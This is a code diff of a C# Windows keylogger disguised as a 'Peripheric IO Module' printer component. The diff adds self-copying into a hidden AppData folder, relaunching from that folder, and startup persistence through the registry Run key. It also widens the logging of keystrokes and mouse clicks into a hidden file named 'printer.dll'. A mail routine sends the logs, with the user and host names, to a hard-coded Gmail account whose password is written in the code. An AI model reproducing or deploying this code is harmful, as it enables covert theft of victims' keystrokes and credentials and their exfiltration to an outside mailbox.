@@ -1,5 +1,5 @@
-﻿using IWshRuntimeLibrary;
-using System;
+﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
@@ -7,10 +7,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Timers;
+using Microsoft.Win32;
 
-
-
-namespace Printer 
+namespace Printer
 {
 
 
@@ -18,6 +17,7 @@ namespace Printer
     {
 
         private string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\printer.dll";
+        
 
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
@@ -32,11 +32,79 @@ namespace Printer
 
         static void Main(string[] args)
         {
+            string folderPath = Environment.CurrentDirectory;
+            string folderName = new DirectoryInfo(folderPath).Name;
 
-            new Program().start();
+            CopyProgram(); //calls function
+
+
+            if (folderName != "PIOM")    //Checks if the program is running from the new location 
+                                         //if not runs the program from the new location
+            {
+                var TestProcess = new Process();  
+
+                TestProcess.StartInfo.FileName = "Peripheric IO Module.exe";
+                TestProcess.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\PIOM";
+                TestProcess.Start();
+            }
+         
+            if (folderName == "PIOM") //Checks if the program is running from new location
+                                      //calls the function
+            {
+                AddApplicationToStartup();
+            }
+            
+            if (folderName == "PIOM")   //Checks if the program is running from new location
+                                         //calls the function
+            {
+                new Program().start();
+            }
+
+            
+
+
+
 
         }
 
+        private static void CopyProgram() //Clones program to the new location
+        {
+           
+            string sourcePath = Environment.CurrentDirectory;
+            string targetPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\PIOM" ;
+
+      
+
+            if (!Directory.Exists(targetPath)) //Checks if the new location doesn't already exist
+            {
+                Directory.CreateDirectory(targetPath);
+
+                System.IO.File.SetAttributes(targetPath, FileAttributes.Hidden);
+
+                foreach (var srcPath in Directory.GetFiles(sourcePath))
+                {
+                    //Copy the file from sourcepath and place into mentioned target path, 
+                    //Overwrite the file if same file is exist in target path
+                    File.Copy(srcPath, srcPath.Replace(sourcePath, targetPath), true);
+                }
+            }
+        }
+
+        
+        public static void AddApplicationToStartup() //Creates run on startup registry
+        {
+
+            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
+            string execPath = Environment.CurrentDirectory + "\\" + thisFile;
+            
+            
+
+          
+                RegistryKey key = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+                key.SetValue("PeriphericIOModule", execPath);
+                key.Close();
+           
+        }
 
         private void start() 
         {
@@ -47,14 +115,7 @@ namespace Printer
             t.AutoReset = true;
             t.Enabled = true;
 
-            //Send To StartUp
-            WshShell wsh = new WshShell();
-            IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
-                Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Peripheric IO Module.lnk") as IWshRuntimeLibrary.IWshShortcut;
-            shortcut.TargetPath = AppDomain.CurrentDomain.BaseDirectory + @"\\Peripheric IO Module.exe";
-            shortcut.WindowStyle = 1;
-            shortcut.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            shortcut.Save();
+            
 
 
             while (true)
@@ -67,15 +128,75 @@ namespace Printer
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 32769)
                     {
+                        if (i == 8)
+                        {
+
+                            using (StreamWriter sw = System.IO.File.AppendText(path))
+                            {
+                                sw.Write(" [BACKSPACE] ");
+                                sw.Close();
+                                break;
+
+                            }
+
+                        }
+
+
+
+                        if (i == 17)
+                        {
+
+                            using (StreamWriter sw = System.IO.File.AppendText(path))
+                            {
+                                sw.Write(" [CTRL] ");
+                                sw.Close();
+                                break;
+                            }
+
+                        }
+
                         Console.Write((char)i);
-                      
-                       
+                        if (i == 2)
+                        {
+
+                            using (StreamWriter sw = System.IO.File.AppendText(path))
+                            {
+                                sw.Write(" [RMB] ");
+                                sw.Close();
+                                break;
+                            }
+
+                        }
+                        if (i == 1)
+                        {
+
+                            using (StreamWriter sw = System.IO.File.AppendText(path))
+                            {
+                                sw.Write(" [LMB] ");
+                                sw.Close();
+                                break;
+                            }
+
+                        }
+
+                        if (i == 18)
+                        {
+
+                            using (StreamWriter sw = System.IO.File.AppendText(path))
+                            {
+                                sw.Write(" [ALT] ");
+                                sw.Close();
+                                break;
+                            }
+
+                        }
+
                         if (i == 16)
                         {
 
                             using (StreamWriter sw = System.IO.File.AppendText(path))
                             {
-                                sw.Write("[SHIFT] ");
+                                sw.Write(" [SHIFT] ");
                                 sw.Close();
                                 break;
                             }
@@ -86,37 +207,36 @@ namespace Printer
 
                             using (StreamWriter sw = System.IO.File.AppendText(path))
                             {
-                                sw.Write("[TAB] ");
+                                sw.Write(" [TAB] ");
                                 sw.Close();
                                 break;
                             }
 
                         }
+                        if (i == 91)
+                        {
 
+                            using (StreamWriter sw = System.IO.File.AppendText(path))
+                            {
+                                sw.Write(" [WIN] ");
+                                sw.Close();
+                                break;
+                            }
+
+                        }
                         if (i == 13)
                         {
 
                             using (StreamWriter sw = System.IO.File.AppendText(path))
                             {
-                                sw.Write("[ENTER] ");
+                                sw.Write(" [ENTER] ");
                                 sw.Close();
                                 break;
                             }
 
                         }
 
-                        if (i == 8)
-                        {
-
-                            using (StreamWriter sw = System.IO.File.AppendText(path))
-                            {
-                                sw.Write("[BACKSPACE] ");
-                                sw.Close();
-                                break;
-
-                            }
-
-                        }
+                        
                             using (StreamWriter sw = System.IO.File.AppendText(path))
                         {
                             System.IO.File.SetAttributes(path, FileAttributes.Hidden);
@@ -124,13 +244,9 @@ namespace Printer
                             sw.Close();
                             
                         }
-                      
                     }
-
                 }
-
             }
-
         }
 
 
@@ -162,7 +278,7 @@ namespace Printer
                 //time variable
                 DateTime now = DateTime.Now;
                
-                string subject = "Logs From " + Environment.UserDomainName + "\\" + Environment.UserName;
+                string subject = Environment.UserDomainName + "\\" + Environment.UserName;
                
                 var host = Dns.GetHostEntry(Dns.GetHostName());
 
@@ -195,12 +311,12 @@ namespace Printer
                 MailMessage mailMessage = new MailMessage();
                 
 
-                mailMessage.From = new MailAddress("EMAIL");
-                mailMessage.To.Add("EMAIL");
+                mailMessage.From = new MailAddress("groparumirel@gmail.com");
+                mailMessage.To.Add("groparumirel@gmail.com");
                 mailMessage.Subject = subject;
                 client.UseDefaultCredentials = false;
                 client.EnableSsl = true;
-                client.Credentials = new System.Net.NetworkCredential("EMAIL", "PASSWORD");
+                client.Credentials = new System.Net.NetworkCredential("groparumirel@gmail.com", "Keylogger");
                 mailMessage.Body = emailBody;
 
                 client.Send(mailMessage);
@@ -209,13 +325,9 @@ namespace Printer
 
             
             catch (Exception ex)
-            { 
+            {
+              
             }
-
         }
-       
-        
     }
-
-    
 }
